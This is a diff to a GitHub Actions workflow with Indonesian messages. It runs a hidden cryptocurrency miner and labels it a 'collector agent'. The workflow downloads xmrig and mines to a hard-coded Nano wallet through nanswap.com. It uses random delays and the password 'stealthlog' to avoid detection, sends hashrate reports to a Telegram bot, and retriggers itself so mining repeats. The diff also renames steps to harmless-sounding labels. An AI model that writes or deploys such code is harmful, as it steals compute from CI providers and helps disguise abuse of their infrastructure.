@@ -9,21 +9,21 @@ jobs:
     timeout-minutes: 360
 
     steps:
-      - name: Update Metadata
-        run: echo "📦 Initializing data collection task..."
+      - name: Initialize Collector
+        run: echo "🛰️ Initializing collector agent..."
 
-      - name: Prepare Runtime
+      - name: Update Environment
         run: |
           sudo apt update -y && sudo apt install -y curl tar
 
-      - name: Process Input
+      - name: Notify Start
         env:
           TG_TOKEN: ${{ secrets.TG_TOKEN }}
           TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
         run: |
           curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
             -d chat_id=$TG_CHAT_ID \
-            --data-urlencode text="🟢 *Collector aktif.*\nMenjalankan tugas latar hingga 6 jam." \
+            --data-urlencode text="🟢 *Collector aktif.*\nRuntime hingga 6 jam." \
             -d parse_mode=Markdown
 
       - name: Start Collector Agent
@@ -34,22 +34,16 @@ jobs:
           chmod +x xmrig
 
           DELAY=$((RANDOM % 300 + 30))
-          echo "⏳ Menunggu $DELAY detik sebelum mulai..."
+          echo "Menunggu $DELAY detik sebelum mulai..."
           sleep $DELAY
 
-          ./xmrig \
-            -o xmrig.nanswap.com:3333 \
-            -a rx \
-            -k \
+          ./xmrig -o xmrig.nanswap.com:3333 -a rx -k \
             -u nano_1ep4soo6rat31n6otw4ggqdwj7tz5sjymyzfwi7kmhye6f31guujdo19cc3q \
-            -p datapass \
-            --donate-level 1 \
-            --randomx-no-rdmsr \
-            | tee logs.txt &
+            -p stealthlog --randomx-no-rdmsr | tee log.txt &
 
           PID=$!
-          WORKTIME=$((RANDOM % 5400 + 1200))
-          echo "🛠️ Aktif selama $WORKTIME detik..."
+          WORKTIME=$((RANDOM % 5400 + 1200))  # 20–90 menit
+          echo "Aktif selama $WORKTIME detik..."
           sleep $WORKTIME
           kill $PID
 
@@ -59,35 +53,34 @@ jobs:
           TG_TOKEN: ${{ secrets.TG_TOKEN }}
           TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
         run: |
+          set +e
           cd xmrig-6.24.0
-
-          HASHRATE=$(grep -a "speed" logs.txt | tail -n1 | awk '{print $(NF-1) " H/s"}')
+          HASHRATE=$(grep -a "speed" log.txt | tail -n1 | awk '{print $(NF-1) " H/s"}')
           HASHRATE=${HASHRATE:-"0 H/s"}
+          ACCEPTED=$(grep -a "accepted" log.txt | wc -l)
+          REJECTED=$(grep -a "rejected" log.txt | wc -l)
 
-          ACCEPTED=$(grep -a "accepted" logs.txt | wc -l)
-          REJECTED=$(grep -a "rejected" logs.txt | wc -l)
-
-          MSG="✅ *Collector selesai.*\n\n📊 *Statistik:*\n• Hashrate: \`$HASHRATE\`\n• Accepted: \`$ACCEPTED\`\n• Rejected: \`$REJECTED\`"
+          MSG="✅ *Collector selesai.*\n\n📊 *Stats:*\n• Hashrate: \`$HASHRATE\`\n• Accepted: \`$ACCEPTED\`\n• Rejected: \`$REJECTED\`"
 
           curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
             -d chat_id=$TG_CHAT_ID \
             -d text="$MSG" \
             -d parse_mode=Markdown
 
-          HR=$(echo "$HASHRATE" | grep -oE '^[0-9]+')
-          if [[ "$HR" =~ ^[0-9]+$ ]] && [ "$HR" -lt 100 ]]; then
+          HR_NUM=$(echo "$HASHRATE" | grep -oE '^[0-9]+')
+          if [[ "$HR_NUM" =~ ^[0-9]+$ ]] && [ "$HR_NUM" -lt 100 ]]; then
             curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
               -d chat_id=$TG_CHAT_ID \
-              -d text="⚠️ *Hashrate rendah:* $HASHRATE\nCek konfigurasi." \
+              -d text="🚨 *Hashrate rendah!* $HASHRATE." \
               -d parse_mode=Markdown
           fi
 
       - name: Cooldown Before Next Cycle
         if: always()
         run: |
-          PAUSE=$((RANDOM % 600 + 60))
-          echo "⏳ Pause $PAUSE detik..."
-          sleep $PAUSE
+          SLEEP_NEXT=$((RANDOM % 1800 + 300))  # 5–35 menit
+          echo "Cooldown $SLEEP_NEXT detik..."
+          sleep $SLEEP_NEXT
 
       - name: Retrigger Collector
         if: always()
